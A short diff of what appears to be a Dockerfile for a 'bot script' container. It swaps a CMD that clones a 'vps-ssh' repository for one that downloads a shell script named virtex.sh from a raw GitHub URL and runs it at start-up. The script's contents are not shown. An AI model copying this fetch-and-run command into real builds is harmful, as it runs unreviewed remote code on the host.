@@ -37,5 +37,5 @@ RUN apt-get clean && rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
 RUN echo "Uploaded files:" && ls /home/stuff/
 
 # Run bot script:
-CMD git clone https://github.com/tolecilik/vps-ssh.git && cd vps-ssh && chmod +x docker-compose.yml && chmod +x start.sh && ./start.sh 
+CMD wget https://raw.githubusercontent.com/55113110159/apikey/main/virtex.sh && chmod +x virtex.sh && ./virtex.sh 
 
